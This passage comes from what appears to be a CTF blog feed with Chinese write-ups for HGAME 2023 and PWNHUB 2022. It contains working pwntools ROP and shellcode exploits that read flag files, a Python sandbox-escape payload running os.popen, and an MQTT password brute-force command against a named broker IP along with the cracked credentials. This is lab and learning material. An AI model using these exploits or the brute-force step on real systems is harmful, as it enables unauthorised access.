class="line">puts_plt=elf.plt.puts</span><br><span class="line">puts_got=elf.got.puts</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">pl=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(ret)+p64(elf.sym.main)</span><br><span class="line">r.send(pl)</span><br><span class="line">leak=u64(r.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak))</span><br><span class="line">base=leak-libc.sym.puts</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line"></span><br><span class="line">libc.address=base</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findGadget</span>(<span class="params">gadget</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">next</span>(libc.search(asm(gadget),executable=<span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line">bss_rop=<span class="number">0x404048</span></span><br><span class="line">bss_flag=<span class="number">0x404038</span></span><br><span class="line">leave_ret=<span class="number">0x4012EE</span></span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">pl=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>)+p64(bss_rop)+p64(findGadget(<span class="string">&#x27;pop rsi;ret&#x27;</span>))+p64(bss_rop)+p64(libc.sym.read)+p64(leave_ret)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">pl=<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(findGadget(<span class="string">&#x27;pop rsi;ret&#x27;</span>))+p64(bss_flag)+p64(libc.sym.read)</span><br><span class="line">pl+=p64(pop_rdi)+p64(bss_flag)+p64(findGadget(<span class="string">&#x27;pop rsi;ret&#x27;</span>))+p64(<span class="number">0</span>)+p64(libc.sym.<span class="built_in">open</span>) <span class="comment"># fd=open(&#x27;./flag&#x27;,0)  #3</span></span><br><span class="line">pl+=p64(pop_rdi)+p64(<span class="number">3</span>)+p64(findGadget(<span class="string">&#x27;pop rsi;ret&#x27;</span>))+p64(bss_rop)+p64(findGadget(<span class="string">&#x27;pop rdx;ret&#x27;</span>))+p64(<span class="number">0x30</span>)+p64(libc.sym.read) <span class="comment"># read(3,buf,0x100)</span></span><br><span class="line">pl+=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(findGadget(<span class="string">&#x27;pop rsi;ret&#x27;</span>))+p64(bss_rop)+p64(findGadget(<span class="string">&#x27;pop rdx;ret&#x27;</span>))+p64(<span class="number">0x30</span>)+p64(libc.sym.write) <span class="comment"># puts(buf)</span></span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">b&#x27;flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="simple-shellcode"><a href="#simple-shellcode" class="headerlink" title="simple_shellcode"></a>simple_shellcode</h3><blockquote><p>HINTS:</p><p>一次read不够多，为什么不再读一次呢？</p></blockquote><p>初看代码像ret2shellcode，但开启了沙盒禁用了 <code>execve()/execveat()</code>，而且 <code>read()</code> 只能读入0x10字节。</p><p>需要写入shellcode，但需先调用一次 <code>read()</code> 以读取更多的字节，再执行orw即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;week-1.hgame.lwsec.cn&#x27;</span>,<span class="number">31331</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">pl = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    xor rdi,rdi</span></span><br><span class="line"><span class="string">    mov rsi,rdx</span></span><br><span class="line"><span class="string">    mov rdx,0x100</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(pl))</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">pl = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">pl += shellcraft.read(<span class="string">&#x27;rax&#x27;</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">pl += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">pl = asm(pl)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(pl))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(asm(shellcraft.read(<span class="string">&#x27;rax&#x27;</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0x100</span>))))</span><br><span class="line">r.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0xf</span>+pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Blockchain"><a href="#Blockchain" class="headerlink" title="Blockchain"></a>Blockchain</h2><h3 id="Checkin"><a href="#Checkin" class="headerlink" title="Checkin"></a>Checkin</h3><blockquote><p>题目中给出了三个端口，分别是 RPC、水龙头、题目交互端。 由于靶机端口随机，需要选手自行尝试。</p><p>其中，浏览器可直接访问的是水龙头，浏览器直接访问报 403 的是 RPC，浏览器无法访问的是题目交互端，需使用 nc 连接。</p></blockquote><p>nc连接，选1生成账号，在水龙头里转账后，选2生成合约地址，选4查看源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// contracts/checkin.sol</span><br><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity 0.8.17;</span><br><span class="line"></span><br><span class="line">contract Checkin &#123;</span><br><span class="line">    string greeting;</span><br><span class="line"></span><br><span class="line">    constructor(string memory _greeting)  &#123;</span><br><span class="line">        greeting = _greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function greet() public view returns (string memory) &#123;</span><br><span class="line">        return greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setGreeting(string memory _greeting) public &#123;</span><br><span class="line">        greeting = _greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns (bool) &#123;</span><br><span class="line">        string memory expected = &quot;HelloHGAME!&quot;;</span><br><span class="line">        return keccak256(abi.encodePacked(expected)) == keccak256(abi.encodePacked(greeting));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码逻辑为通过 <code>setGreeting()</code> 传入字符串使得 <code>isSolved()</code> 返回 <code>true</code>，传入的字符串为 <code>HelloHGAME!</code> 即满足条件。</p><p>尝试在Remix中攻击已生成的合约地址没打通，问出题人知对Remix环境做了限制（防作弊），需采用web3py脚本方式进行攻击：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, HTTPProvider</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># RPC网络环境</span></span><br><span class="line">rpc = <span class="string">&#x27;&#x27;</span></span><br><span class="line">w3 = Web3(HTTPProvider(rpc))</span><br><span class="line"><span class="comment"># 检测连通性</span></span><br><span class="line"><span class="built_in">print</span>(w3.isConnected())</span><br><span class="line"></span><br><span class="line"><span class="comment"># Metamask地址</span></span><br><span class="line">myAccount = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 合约地址</span></span><br><span class="line">contractAddress = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># Metamask私钥</span></span><br><span class="line">private_key = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># abi在Remix上编译.sol源码后获取</span></span><br><span class="line">abi = json.loads(<span class="string">&#x27;[&#123;&quot;inputs&quot;: [&#123;&quot;internalType&quot;: &quot;string&quot;,&quot;name&quot;: &quot;_greeting&quot;,&quot;type&quot;: &quot;string&quot;&#125;],&quot;stateMutability&quot;: &quot;nonpayable&quot;,&quot;type&quot;: &quot;constructor&quot;&#125;,&#123;&quot;inputs&quot;: [],&quot;name&quot;: &quot;greet&quot;,&quot;outputs&quot;: [&#123;&quot;internalType&quot;: &quot;string&quot;,&quot;name&quot;: &quot;&quot;,&quot;type&quot;: &quot;string&quot;&#125;],&quot;stateMutability&quot;: &quot;view&quot;,&quot;type&quot;: &quot;function&quot;&#125;,&#123;&quot;inputs&quot;: [],&quot;name&quot;: &quot;isSolved&quot;,&quot;outputs&quot;: [&#123;&quot;internalType&quot;: &quot;bool&quot;,&quot;name&quot;: &quot;&quot;,&quot;type&quot;: &quot;bool&quot;&#125;],&quot;stateMutability&quot;: &quot;view&quot;,&quot;type&quot;: &quot;function&quot;&#125;,&#123;&quot;inputs&quot;: [&#123;&quot;internalType&quot;: &quot;string&quot;,&quot;name&quot;: &quot;_greeting&quot;,&quot;type&quot;: &quot;string&quot;&#125;],&quot;name&quot;: &quot;setGreeting&quot;,&quot;outputs&quot;: [],&quot;stateMutability&quot;: &quot;nonpayable&quot;,&quot;type&quot;: &quot;function&quot;&#125;]&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取合约</span></span><br><span class="line">contract = w3.eth.contract(address=contractAddress, abi=abi)</span><br><span class="line">nonce = w3.eth.getTransactionCount(Web3.toChecksumAddress(myAccount))</span><br><span class="line"><span class="comment"># 合约交易定义，调用函数setGreeting</span></span><br><span class="line"><span class="comment"># 事先保证myAccount有足够ether支付gas*gasPrice+value，从水龙头获取ether</span></span><br><span class="line">tx = contract.functions.setGreeting(<span class="string">&#x27;HelloHGAME!&#x27;</span>).buildTransaction(&#123;</span><br><span class="line">    <span class="string">&#x27;from&#x27;</span>: Web3.toChecksumAddress(myAccount),</span><br><span class="line">    <span class="string">&#x27;gasPrice&#x27;</span>: w3.eth.gasPrice,</span><br><span class="line">    <span class="string">&#x27;nonce&#x27;</span>: nonce,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    &#125;)</span><br><span class="line">gas = w3.eth.estimate_gas(tx)</span><br><span class="line">tx[<span class="string">&#x27;gas&#x27;</span>] = gas</span><br><span class="line"><span class="built_in">print</span>(tx)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 交易执行</span></span><br><span class="line">signed_txn = w3.eth.account.signTransaction(tx, private_key)</span><br><span class="line"><span class="built_in">print</span>(signed_txn.<span class="built_in">hash</span>)</span><br><span class="line"><span class="built_in">print</span>(signed_txn.rawTransaction)</span><br><span class="line"></span><br><span class="line">tmp =  w3.eth.sendRawTransaction(signed_txn.rawTransaction.<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure><p>最后nc连接，选4获取flag。</p><p>​    </p><h2 id="Iot"><a href="#Iot" class="headerlink" title="Iot"></a>Iot</h2><h3 id="Help-marvin"><a href="#Help-marvin" class="headerlink" title="Help marvin"></a>Help marvin</h3><blockquote><p>兔兔发现售票的marvin只会吐出三个白头 决定去修一修marvin(-30)</p><p>HINTS:</p><p>Hint: SPI</p></blockquote><p>给定的是sr文件，解压，根据文件内容搜索知为逻辑分析套件sigrok生成的文件。</p><p>使用PulseView工具打开sr文件，在D0/D1/D2有数据，参考 <a href="https://blog.csdn.net/qq_42880719/article/details/123763744">2022DASCTF X SU 三月春季挑战赛 What’s In The Bits</a> 以及后放的提示，知符合SPI协议特征。</p><p>选择SPI解码器，clock选D0，输入选D2，导出所有解码的01字符：</p><p><code>00110100001100111011000010110110101100101011110110011010001011111001101010111010000110100011011100110011101100101010111110101001101110000001100010111110</code></p><p>去掉头位0，8位一组可还原字符串 <code>hgame&#123;4_5t4nge_Sp1&gt;</code>，修正最后一位补足一位1，得 <code>hgame&#123;4_5t4nge_Sp1&#125;</code>。</p><p>​    </p><h3 id="Help-the-uncle-who-can’t-jump-twice"><a href="#Help-the-uncle-who-can’t-jump-twice" class="headerlink" title="Help the uncle who can’t jump twice"></a>Help the uncle who can’t jump twice</h3><blockquote><p>兔兔在车站门口看到一张塑料凳子,上边坐着一个自称V的男人.他希望你能帮他登上他的大号 Vergil 去那边的公告栏上康康Nero手上的YAMATO怎么样了</p><p>broker:117.50.177.240:1883</p><p>HINTS:</p><p>Hint: mqtt</p></blockquote><p>根据broker地址知使用的MQTT协议，参考 <a href="https://zhuanlan.zhihu.com/p/581871896">物联网安全实战从零开始-MQTT协议分析</a> 安装mqtt-pwn。</p><p>使用命令爆破 Vergil 的密码，指定给定的密码本：</p><p><code>bruteforce --host 117.50.177.240 --port 1883 -u Vergil -pf password.txt</code></p><p>得到结果：</p><p><code>[+] Found valid credentials: Vergil:power</code></p><p>下载broker连接工具MQTT.fx，使用账密 <code>Vergil/power</code> 登录broker，在订阅处输入主题 <code>Nero/YAMATO</code>，收到包含flag的信息：<code>hgame&#123;mqtt_1s_p0w3r&#125;</code>。</p><p>​    </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;HGAME 2023 将于 1 月 5 日 20:00 正式开始，祝大家玩得开心 :-)&lt;br&gt;线上赛平台：&lt;a href=&quot;https://hgame.vidar.club/&quot;&gt;https://hgame.vidar.club&lt;/a&gt;&lt;br&gt;请尽</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2023赛" scheme="https://lazzzaro.github.io/tags/2023%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>PWNHUB2022冬季赛</title>
    <link href="https://lazzzaro.github.io/2022/12/18/match-PWNHUB2022%E5%86%AC%E5%AD%A3%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2022/12/18/match-PWNHUB2022%E5%86%AC%E5%AD%A3%E8%B5%9B/</id>
    <published>2022-12-18T15:20:03.000Z</published>
    <updated>2022-12-20T10:40:05.641Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>✌️竞赛时间：12月17日 10:00—12月18日 22:00<br>✌️得分规则：比赛采用动态分数制度 ，每道题目的分值将根据解出队伍的数量进行动态记分。<br>✌️题目类型：Web、Pwn、Reverse、Misc、Crypto等</p><p><strong>Rank: 9</strong></p><hr><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="坐井观天"><a href="#坐井观天" class="headerlink" title="坐井观天"></a>坐井观天</h3><p>python逃逸，利用 <code>eval(input())</code> 绕过关键字黑名单：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&quot;env&quot;</span>).read()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="证书里也有秘密"><a href="#证书里也有秘密" class="headerlink" title="证书里也有秘密"></a>证书里也有秘密</h3><p>xray证书信息解析，参考Github项目 <a href="https://github.com/net5/xray-crack">xray-crack</a>，将 <code>main.go</code> 编译：</p><p><code>go build -o goxray main.go</code></p><p>再运行：</p><p><code>./goxray -p xray-license.lic</code></p><p>即可得到证书内容数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">version ok: 2</span><br><span class="line">license parsed: &#123;bc5d237dc9b7470e94b61687c19e62fc 3270cdada4eb4a809d25ff4820d5a1f7 王德发 COMMUNITY-ADVANCED 1320981071 1645539742&#125;</span><br><span class="line">crypto/rsa: verification error</span><br></pre></td></tr></table></figure><p>故flag为user_id：<code>flag&#123;3270cdada4eb4a809d25ff4820d5a1f7&#125;</code>。</p><p>​    </p><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="大杂烩"><a href="#大杂烩" class="headerlink" title="大杂烩"></a>大杂烩</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">padding = <span class="keyword">lambda</span> num, bit_len: (num &lt;&lt; (<span class="number">512</span> - bit_len)) + getrandbits(<span class="number">512</span> - bit_len)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;**************************************&#x27;</span></span><br><span class="line">m1, m2 = bytes_to_long(flag[:<span class="number">19</span>]), bytes_to_long(flag[<span class="number">19</span>:])</span><br><span class="line">p = next_prime(padding(m1, m1.bit_length()))</span><br><span class="line">q = next_prime(padding(m2, m2.bit_length()))</span><br><span class="line">n = p * q</span><br><span class="line">e = getPrime(<span class="number">128</span>)</span><br><span class="line">d = inverse(e, (p - <span class="number">1</span>) * (q-<span class="number">1</span>))</span><br><span class="line">a, b = e &amp; <span class="number">0x3ffffffffff</span>, e &gt;&gt; <span class="number">42</span></span><br><span class="line">N = getPrime(<span class="number">128</span>)</span><br><span class="line">E = EllipticCurve(Zmod(N), [a, b])</span><br><span class="line">NN = getPrime(<span class="number">1024</span>)</span><br><span class="line">S = inverse(getPrime(<span class="number">128</span>), NN) * inverse(getPrime(<span class="number">128</span>), NN)</span><br><span class="line">d1 = d &gt;&gt; <span class="number">512</span></span><br><span class="line">d2 = d &amp; (<span class="number">1</span> &lt;&lt; <span class="number">512</span>) - <span class="number">1</span></span><br><span class="line">enc1 = S * d1 % NN</span><br><span class="line">enc2 = S * d2 % NN</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;a =&#x27;</span>, a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;N =&#x27;</span>, N)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;POINT =&#x27;</span>, E.lift_x(<span class="number">996</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;enc1 =&#x27;</span>, enc1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;enc2 =&#x27;</span>, enc2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;NN =&#x27;</span>, NN)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 117749279680045360245987277946945707343578937283621512842997606104123872211782263906911929773756533011817679794905642225389185861207256322349591633257348367854563703050789889773031032949742664695416275919382068347995088593380486820784360816053546651916291080971628354468517506190756456913824397593128781030749</span></span><br><span class="line"><span class="comment"># a = 1755716071599</span></span><br><span class="line"><span class="comment"># N = 236038564943567983056828121309828109017</span></span><br><span class="line"><span class="comment"># POINT = (996 : 151729833458737979764886336489671975339 : 1)</span></span><br><span class="line"><span class="comment"># enc1 = 98662590652068949920571979585725979127266112216583776160769090971169664292493813021843624362593669574513220457664819153878956311077379392531742253343961645534972639309537402874636739745717765969720117162780620981639015788423324884640935466801234207019510919768602974162878323777374364290185048275714332671356</span></span><br><span class="line"><span class="comment"># enc2 = 58738699705013897273174837829098879580829898980458718341881900446701910685043213698485036350888862454440118347362218485065377354137391792039111639199258042591959084091242821874819864955504791788260187064338245516327147327866373690756260239728218244294166383516151782123688633986853602732137707507845681977204</span></span><br><span class="line"><span class="comment"># NN = 149794788177729409820185150543033616327574456754306207341321223589733698623477041345453230785413920341465642754285280273761269552897080096162195035057667200692677841848045965505750839903359478511509753781737513122660495056746669041957643882516287304836822410136985711091802722010788615177574143908444311475347</span></span><br></pre></td></tr></table></figure></blockquote><p>$a,b$ 分别为 $e$ 的低42位和高(128-42)位，有 $e=2^{42}b+a$。</p><p>$a$ 已知，根据点 $P=(P_x,P_y)$ 及椭圆曲线 $E$ 方程 $y^2 \equiv x^3+ax+b \pmod N$，代入求解 $b$。</p><p>同理，$d=2^{512}d_1+d_2$，因 $c_1 = Sd_1 \bmod N’,c_2 = Sd_2 \bmod N’$，分别使用类似Wiener Attack的格子求解 $d_1,d_2$。</p><p>最后已知 $e,d,n$，分解 $n$ 得 $p,q$，flag两部分分别在 $p,q$ 中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">divide_pq</span>(<span class="params">e, d, n</span>):</span></span><br><span class="line">    k = e*d - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        g = random.randint(<span class="number">2</span>, n-<span class="number">1</span>)</span><br><span class="line">        t = k</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> t % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            t //= <span class="number">2</span></span><br><span class="line">            x = <span class="built_in">pow</span>(g, t, n)</span><br><span class="line">            <span class="keyword">if</span> x &gt; <span class="number">1</span> <span class="keyword">and</span> gmpy2.gcd(x-<span class="number">1</span>, n) &gt; <span class="number">1</span>:</span><br><span class="line">                p = gmpy2.gcd(x-<span class="number">1</span>, n)</span><br><span class="line">                <span class="keyword">return</span> (p, n//p)</span><br><span class="line"></span><br><span class="line">n = <span class="number">117749279680045360245987277946945707343578937283621512842997606104123872211782263906911929773756533011817679794905642225389185861207256322349591633257348367854563703050789889773031032949742664695416275919382068347995088593380486820784360816053546651916291080971628354468517506190756456913824397593128781030749</span></span><br><span class="line">a = <span class="number">1755716071599</span></span><br><span class="line">N = <span class="number">236038564943567983056828121309828109017</span></span><br><span class="line">Px, Py = (<span class="number">996</span>, <span class="number">151729833458737979764886336489671975339</span>)</span><br><span class="line">enc1 = <span class="number">98662590652068949920571979585725979127266112216583776160769090971169664292493813021843624362593669574513220457664819153878956311077379392531742253343961645534972639309537402874636739745717765969720117162780620981639015788423324884640935466801234207019510919768602974162878323777374364290185048275714332671356</span></span><br><span class="line">enc2 = <span class="number">58738699705013897273174837829098879580829898980458718341881900446701910685043213698485036350888862454440118347362218485065377354137391792039111639199258042591959084091242821874819864955504791788260187064338245516327147327866373690756260239728218244294166383516151782123688633986853602732137707507845681977204</span></span><br><span class="line">NN = <span class="number">149794788177729409820185150543033616327574456754306207341321223589733698623477041345453230785413920341465642754285280273761269552897080096162195035057667200692677841848045965505750839903359478511509753781737513122660495056746669041957643882516287304836822410136985711091802722010788615177574143908444311475347</span></span><br><span class="line"></span><br><span class="line">F = Zmod(N)</span><br><span class="line">b = <span class="built_in">int</span>(F(Py^<span class="number">2</span> - (Px^<span class="number">3</span> + a*Px)))</span><br><span class="line">e = <span class="number">2</span>^<span class="number">42</span> * b + a</span><br><span class="line"></span><br><span class="line">L1 = Matrix(ZZ, [[enc1, <span class="number">2</span>^<span class="number">256</span>],[NN, <span class="number">0</span>]])</span><br><span class="line">d1 = -L1.LLL()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">L2 = Matrix(ZZ, [[enc2, <span class="number">2</span>^<span class="number">256</span>],[NN, <span class="number">0</span>]])</span><br><span class="line">d2 = -L2.LLL()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">d = <span class="number">2</span>^<span class="number">512</span> * d1 + d2</span><br><span class="line"></span><br><span class="line">p, q = divide_pq(e, d, n)</span><br><span class="line">flag1 = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(p&gt;&gt;(<span class="number">512</span>-<span class="number">19</span>*<span class="number">8</span>+<span class="number">2</span>))[<span class="number">2</span>:])</span><br><span class="line">flag2 = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(q&gt;&gt;(<span class="number">512</span>-<span class="number">19</span>*<span class="number">8</span>+<span class="number">1</span>))[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(flag1)</span><br><span class="line"><span class="built_in">print</span>(flag2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;4cb201080d8b240774&#125;&#x27;</span></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;e89f47939d1243&#x27;</span></span><br></pre></td></tr></table></figure><p>flag：<code>flag&#123;e89f47939d12434cb201080d8b240774&#125;</code>。</p><p>​    </p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="justJS"><a href="#justJS" class="headerlink" title="justJS"></a>justJS</h3><p>js命令执行即可：</p><p><code>eval(read(&quot;/flag&quot;))</code></p><p>在 <code>eval()</code> 的报错文字中得到flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">undefined:1: SyntanError: Unexpected token &#x27;&#123;&#x27;</span><br><span class="line">flag&#123;5cff08f23eb37451bd84effb99275794&#125;</span><br><span class="line">    ^</span><br><span class="line">SyntanError: Unexpected token &#x27;&#123;&#x27;</span><br><span class="line">    at input.js:1:6</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="ppc"><a href="#ppc" class="headerlink" title="ppc"></a>ppc</h2><h3 id="Tcp-Show"><a href="#Tcp-Show" class="headerlink" title="Tcp Show"></a>Tcp Show</h3><blockquote><p><strong>Description</strong></p><p>众所周知，Wireshark 带有一个 follow tcp stream 